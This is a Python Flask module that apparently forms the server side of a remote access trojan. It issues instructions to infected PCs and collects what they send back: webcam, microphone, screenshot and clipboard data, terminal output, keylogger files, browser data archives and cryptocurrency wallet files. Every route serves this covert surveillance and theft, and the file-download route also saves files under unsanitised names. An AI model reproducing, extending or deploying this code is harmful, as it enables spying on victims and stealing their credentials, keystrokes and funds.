from flask import Blueprint, request, jsonify
from utils.config import API_KEY
import datetime
import os
import platform
from utils.clients_manager import clients_manager
from utils.server_manager import server_manager

instruct_bp = Blueprint('instruct', __name__)

@instruct_bp.route('/server_info', methods=['GET'])
def server_info():
    """Return server operating system"""
    try:
        system_name = platform.system()
        
        # Map platform names to display names
        os_mapping = {
            'Windows': 'Windows',
            'Linux': 'Linux', 
            'Darwin': 'Mac'
        }
        
        display_os = os_mapping.get(system_name, system_name)
        
        return jsonify({
            'status': 'success',
            'os': display_os
        })
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@instruct_bp.route('/get_instructions', methods=['GET'])
def get_instructions():
    try:
        KEY = request.headers.get("X-API-Key", None)
        if not KEY or KEY != API_KEY:
            return jsonify({'status': 'error', 'message': 'Invalid API key'}), 401

        pc_id = request.args.get('pc_id', None)
        if not pc_id:
            return jsonify({'status': 'error', 'message': 'Invalid request'}), 400

        Instruction = clients_manager.get_instructions(pc_id)

        return jsonify({'status': 'success', 'data': Instruction})
    except:
        return jsonify({'status': 'error', 'message': 'Invalid request'}), 400


@instruct_bp.route('/client_info', methods=['POST'])
def client_info():
    try:
        KEY = request.headers.get("X-API-Key", None)
        if not KEY or KEY != API_KEY:
            return jsonify({'status': 'error', 'message': 'Invalid API key'}), 401

        data = request.get_json()

        clients_manager.add_client(data['pc_id'], data)        
        
        return jsonify({'status': 'success'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': 'Invalid request'}), 400

@instruct_bp.route('/system_info', methods=['POST'])
def system_info():
    try:
        KEY = request.headers.get("X-API-Key", None)
        if not KEY or KEY != API_KEY:
            return jsonify({'status': 'error', 'message': 'Invalid API key'}), 401

        pc_id = request.args.get('pc_id', None)
        if not pc_id:
            return jsonify({'status': 'error', 'message': 'Invalid request'}), 400

        data = request.get_json()

        response_data = {
            "pc_id": pc_id,
            "data": data
        }
        server_manager.add_instruction(f"{pc_id}_system_info", response_data)
        
        return jsonify({'status': 'success'})
    except:
        return jsonify({'status': 'error', 'message': 'Invalid request'}), 400

@instruct_bp.route('/terminal', methods=['POST'])
def terminal():
    try:
        KEY = request.headers.get("X-API-Key", None)
        if not KEY or KEY != API_KEY:
            return jsonify({'status': 'error', 'message': 'Invalid API key'}), 401

        pc_id = request.args.get('pc_id', None)
        if not pc_id:
            return jsonify({'status': 'error', 'message': 'Invalid request'}), 400

        data = request.get_json()
        output = data['data']

        response_data = {
            "pc_id": pc_id,
            "data": output
        }
        server_manager.add_instruction(f"{pc_id}_terminal", response_data)
        
        return jsonify({'status': 'success'})
    except:
        return jsonify({'status': 'error', 'message': 'Invalid request'}), 400


@instruct_bp.route('/microphone', methods=['POST'])
def microphone():
    try:
        KEY = request.headers.get("X-API-Key", None)
        if not KEY or KEY != API_KEY:
            return jsonify({'status': 'error', 'message': 'Invalid API key'}), 401

        pc_id = request.args.get('pc_id', None)
        if not pc_id:
            return jsonify({'status': 'error', 'message': 'Invalid request'}), 400

        data = request.get_json()
        
        if isinstance(data, dict):
            output = data.get('data', '')
        else:
            output = str(data)

        response_data = {
            "pc_id": pc_id,
            "data": output
        }
        server_manager.add_instruction(f"{pc_id}_microphone", response_data)
        
        return jsonify({'status': 'success'})
    except Exception as e:
        print(f"Error in microphone route: {e}")
        return jsonify({'status': 'error', 'message': 'Invalid request'}), 400


@instruct_bp.route('/screenshot', methods=['POST'])
def screenshot():
    try:
        KEY = request.headers.get("X-API-Key", None)
        if not KEY or KEY != API_KEY:
            return jsonify({'status': 'error', 'message': 'Invalid API key'}), 401

        pc_id = request.args.get('pc_id', None)
        if not pc_id:
            return jsonify({'status': 'error', 'message': 'Invalid request'}), 400

        data = request.get_json()
        
        if isinstance(data, dict):
            output = data.get('data', '')
        else:
            output = str(data)

        response_data = {
            "pc_id": pc_id,
            "data": output
        }
        server_manager.add_instruction(f"{pc_id}_screenshot", response_data)
        
        return jsonify({'status': 'success'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': 'Invalid request'}), 400


@instruct_bp.route('/webcam', methods=['POST'])
def webcam():
    try:
        KEY = request.headers.get("X-API-Key", None)
        if not KEY or KEY != API_KEY:
            return jsonify({'status': 'error', 'message': 'Invalid API key'}), 401

        pc_id = request.args.get('pc_id', None)
        if not pc_id:
            return jsonify({'status': 'error', 'message': 'Invalid request'}), 400

        data = request.get_json()
        
        if isinstance(data, dict):
            output = data.get('data', '')
        else:
            output = str(data)

        response_data = {
            "pc_id": pc_id,
            "data": output

        }
        server_manager.add_instruction(f"{pc_id}_webcam", response_data)
        
        return jsonify({'status': 'success'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': 'Invalid request'}), 400


@instruct_bp.route('/task_manager', methods=['POST'])
def task_manager():
    try:
        KEY = request.headers.get("X-API-Key", None)
        if not KEY or KEY != API_KEY:
            return jsonify({'status': 'error', 'message': 'Invalid API key'}), 401

        pc_id = request.args.get('pc_id', None)
        if not pc_id:
            return jsonify({'status': 'error', 'message': 'Invalid request'}), 400

        data = request.get_json()
        
        # Extract task manager data properly
        if isinstance(data, dict):
            output = data.get('data', [])
        else:
            output = []

        response_data = {
            "pc_id": pc_id,
            "data": output
        }
        server_manager.add_instruction(f"{pc_id}_task_manager", response_data)
        
        return jsonify({'status': 'success'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': 'Invalid request'}), 400

@instruct_bp.route('/browser', methods=['POST'])
def browser():
    try:
        KEY = request.headers.get("X-API-Key", None)
        if not KEY or KEY != API_KEY:
            return jsonify({'status': 'error', 'message': 'Invalid API key'}), 401

        pc_id = request.args.get('pc_id', None)
        if not pc_id:
            return jsonify({'status': 'error', 'message': 'Invalid request'}), 400

        if 'file' not in request.files:
            return jsonify({'status': 'error', 'message': 'No file provided', 'request_data': str(request.files)}), 400
            
        file = request.files['file']
        if file.filename == '':
            return jsonify({'status': 'error', 'message': 'No file selected'}), 400

        # Save to server-side downloads folder to make it downloadable via browser
        downloads_dir = os.path.join('template', 'downloads')
        os.makedirs(downloads_dir, exist_ok=True)

        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        zip_filename = f"browser_data_{pc_id}_{timestamp}.zip"
        zip_filepath = os.path.join(downloads_dir, zip_filename)

        file.save(zip_filepath)

        # Provide a URL that the browser UI can open to download the file
        download_url = f"/downloads/{zip_filename}"

        response_data = {
            "pc_id": pc_id,
            "data": {
                "message": f"Browser data ready for {pc_id}",
                "download_url": download_url,
                "filename": zip_filename
            }
        }
        server_manager.add_instruction(f"{pc_id}_browser", response_data)

        return jsonify({'status': 'success'})

    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 400


@instruct_bp.route('/file_manager', methods=['POST'])
def file_manager():
    try:
        KEY = request.headers.get("X-API-Key", None)
        if not KEY or KEY != API_KEY:
            return jsonify({'status': 'error', 'message': 'Invalid API key'}), 401

        pc_id = request.args.get('pc_id', None)
        if not pc_id:
            return jsonify({'status': 'error', 'message': 'Invalid request'}), 400

        data = request.get_json()
        
        if isinstance(data, dict):
            output = data.get('data', '')
        else:
            output = str(data)

        response_data = {
            "pc_id": pc_id,
            "data": output
        }
        server_manager.add_instruction(f"{pc_id}_file_manager", response_data)
        
        return jsonify({'status': 'success'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': 'Invalid request'}), 400

@instruct_bp.route('/file_download', methods=['POST'])
def file_download():
    try:
        KEY = request.headers.get("X-API-Key", None)
        if not KEY or KEY != API_KEY:
            return jsonify({'status': 'error', 'message': 'Invalid API key'}), 401

        pc_id = request.args.get('pc_id', None)
        filename = request.args.get('filename', None)
        if not pc_id or not filename:
            return jsonify({'status': 'error', 'message': 'Invalid request'}), 400

        if 'file' not in request.files:
            return jsonify({'status': 'error', 'message': 'No file provided'}), 400
            
        file = request.files['file']
        if file.filename == '':
            return jsonify({'status': 'error', 'message': 'No file selected'}), 400

        # Save to server-side downloads so browser can download directly
        downloads_dir = os.path.join('template', 'downloads')
        os.makedirs(downloads_dir, exist_ok=True)

        download_filepath = os.path.join(downloads_dir, filename)
        file.save(download_filepath)

        download_url = f"/downloads/{filename}"

        response_data = {
            "pc_id": pc_id,
            "filename": filename,
            "data": {
                "message": f"File {filename} ready for download",
                "download_url": download_url,
                "filename": filename
            }
        }
        server_manager.add_instruction(f"{pc_id}_file_download", response_data)
        
        return jsonify({'status': 'success'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': 'Invalid request'}), 400

@instruct_bp.route('/remote_desktop', methods=['POST'])
def remotedesktop():
    try:
        KEY = request.headers.get("X-API-Key", None)
        if not KEY or KEY != API_KEY:
            return jsonify({'status': 'error', 'message': 'Invalid API key'}), 401

        pc_id = request.args.get('pc_id', None)
        if not pc_id:
            return jsonify({'status': 'error', 'message': 'Invalid request'}), 400

        data = request.get_json()
        output = data.get('data', '')

        response_data = {
            "pc_id": pc_id,
            "data": output
        }

        type_ = data.get('type', '')
        if type_ == 'screenshot':
            server_manager.add_instruction(f"{pc_id}_remote_desktop_screenshot", response_data)
        
        return jsonify({'status': 'success'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': 'Invalid request'}), 400

@instruct_bp.route('/clipboard', methods=['POST'])
def clipboard():
    try:
        KEY = request.headers.get("X-API-Key", None)
        if not KEY or KEY != API_KEY:
            return jsonify({'status': 'error', 'message': 'Invalid API key'}), 401

        pc_id = request.args.get('pc_id', None)
        if not pc_id:
            return jsonify({'status': 'error', 'message': 'Invalid request'}), 400

        data = request.get_json()
        
        if isinstance(data, dict):
            output = data.get('data', '')
        else:
            output = str(data)

        response_data = {
            "pc_id": pc_id,
            "data": output
        }

        server_manager.add_instruction(f"{pc_id}_clipboard", response_data)
        
        return jsonify({'status': 'success'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': 'Invalid request'}), 400

@instruct_bp.route('/logger', methods=['POST'])
def logger():
    try:
        KEY = request.headers.get("X-API-Key", None)
        if not KEY or KEY != API_KEY:
            return jsonify({'status': 'error', 'message': 'Invalid API key'}), 401

        pc_id = request.args.get('pc_id', None)
        if not pc_id:
            return jsonify({'status': 'error', 'message': 'Invalid request'}), 400

        if 'file' not in request.files:
            return jsonify({'status': 'error', 'message': 'No file provided'}), 400
            
        file = request.files['file']
        if file.filename == '':
            return jsonify({'status': 'error', 'message': 'No file selected'}), 400

        # Save to server-side downloads folder to make it downloadable via browser
        downloads_dir = os.path.join('template', 'downloads')
        os.makedirs(downloads_dir, exist_ok=True)

        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        log_filename = f"logger_{pc_id}_{timestamp}.txt"
        log_filepath = os.path.join(downloads_dir, log_filename)

        file.save(log_filepath)

        # Provide a URL that the browser UI can open to download the file
        download_url = f"/downloads/{log_filename}"

        response_data = {
            "pc_id": pc_id,
            "data": {
                "message": f"Logger data ready for {pc_id}",
                "download_url": download_url,
                "filename": log_filename
            }
        }
        server_manager.add_instruction(f"{pc_id}_logger", response_data)

        return jsonify({'status': 'success'})

    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 400

@instruct_bp.route('/wallet', methods=['POST'])
def wallet():
    try:
        KEY = request.headers.get("X-API-Key", None)
        if not KEY or KEY != API_KEY:
            return jsonify({'status': 'error', 'message': 'Invalid API key'}), 401

        pc_id = request.args.get('pc_id', None)
        if not pc_id:
            return jsonify({'status': 'error', 'message': 'Invalid request'}), 400

        if 'file' not in request.files:
            return jsonify({'status': 'error', 'message': 'No file provided'}), 400
            
        file = request.files['file']
        if file.filename == '':
            return jsonify({'status': 'error', 'message': 'No file selected'}), 400

        # Save to server-side downloads folder to make it downloadable via browser
        downloads_dir = os.path.join('template', 'downloads')
        os.makedirs(downloads_dir, exist_ok=True)

        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        wallet_filename = f"wallet_{pc_id}_{timestamp}.txt"
        wallet_filepath = os.path.join(downloads_dir, wallet_filename)

        file.save(wallet_filepath)

        # Provide a URL that the browser UI can open to download the file
        download_url = f"/downloads/{wallet_filename}"

        response_data = {
            "pc_id": pc_id,
            "data": {
                "message": f"Wallet data ready for {pc_id}",
                "download_url": download_url,
                "filename": wallet_filename
            }
        }
        server_manager.add_instruction(f"{pc_id}_wallet", response_data)

        return jsonify({'status': 'success'})

    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 400
